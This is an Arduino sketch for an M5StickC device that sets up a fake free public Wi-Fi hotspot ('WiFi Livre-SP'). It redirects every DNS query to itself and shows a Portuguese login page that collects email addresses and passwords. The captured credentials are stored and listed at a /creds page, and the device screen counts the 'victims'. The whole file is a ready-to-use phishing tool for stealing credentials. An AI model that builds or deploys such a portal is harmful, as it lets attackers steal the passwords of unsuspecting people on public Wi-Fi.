#include <M5StickC.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

// Configuração do usuário
#define SSID_NAME "WiFi Livre-SP"
#define SUBTITLE "Servico gratuito de internet"
#define TITLE "Faca o Login:"
#define BODY "Primeiro, crie uma conta para ter acesso."
#define POST_TITLE "Estamos validando..."
#define POST_BODY "Sua conta foi validada! Agora, aguarde entre 3 a 5 minutos para que seja conectado a rede.</br>Obrigado."
#define PASS_TITLE "Credenciais"
#define CLEAR_TITLE "Limpo"

int capcount = 0;
int previous = -1; // Hack to keep track
int BUILTIN_LED = 10;

// Inicialização das configurações do sistema
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

String Credenciais = "";
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer() {
  return "</div><div class=q><a>&#169; Todos os direitos reservados.</a></div>";
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String creds() {
  return header(PASS_TITLE) + "<ol>" + Credenciais + "</ol><br><center><p><a style=\"color:blue\" href=/>Voltar para o Índice</a></p><p><a style=\"color:blue\" href=/clear>Limpar senhas</a></p></center>" + footer();
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
         "<b>Email:</b> <center><input type=text autocomplete=email name=email></input></center>" +
         "<b>Senha:</b> <center><input type=password name=Senha></input><input type=submit value=\"Sign in\"></form></center>" + footer();
}

String posted() {
  String email = input("email");
  String Senha = input("Senha");
  Credenciais = "<li>Email: <b>" + email + "</b></br>Senha: <b>" + Senha + "</b></li>" + Credenciais;
  return header(POST_TITLE) + POST_BODY + footer();
}

String clear() {
  String email = "<p></p>";
  String Senha = "<p></p>";
  Credenciais = "<p></p>";
  return header(CLEAR_TITLE) + "<div><p>A lista de credenciais foi resetada.</div></p><center><a style=\"color:blue\" href=/>Voltar para o Índice</a></center>" + footer();
}

void BLINK() { // O LED interno piscará 5 vezes quando uma senha for recebida.
  int count = 0;
  while (count < 5) {
    digitalWrite(BUILTIN_LED, LOW);
    delay(500);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(500);
    count = count + 1;
  }
}

void setup() {
  M5.begin();
  M5.Lcd.setRotation(3);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setSwapBytes(true);
  M5.Lcd.setTextSize(2);

  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP); // Spoofing DNS (Apenas HTTP)

  webServer.on("/post", []() {
    capcount = capcount + 1;
    webServer.send(HTTP_CODE, "text/html", posted());
    M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
    M5.Lcd.setCursor(0, 45);
    M5.Lcd.print("status: ");
    M5.Lcd.print("Vítima dentro");
    BLINK();
    M5.Lcd.fillScreen(BLACK);
  });

  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });
  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
    if (capcount > previous) {
      previous = capcount;

      M5.Lcd.fillScreen(BLACK);
      M5.Lcd.setSwapBytes(true);
      M5.Lcd.setTextSize(2);
      M5.Lcd.setTextColor(TFT_RED, TFT_BLACK);
      M5.Lcd.setCursor(0, 10);
      M5.Lcd.print("PORTAL CAPTIVO");
      M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
      M5.Lcd.setCursor(0, 35);
      M5.Lcd.print("WiFi IP: ");
      M5.Lcd.println(APIP);
      M5.Lcd.printf("SSID: %s\n", SSID_NAME);
      M5.Lcd.printf("Contagem de vítimas: %d\n", capcount);
    }
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
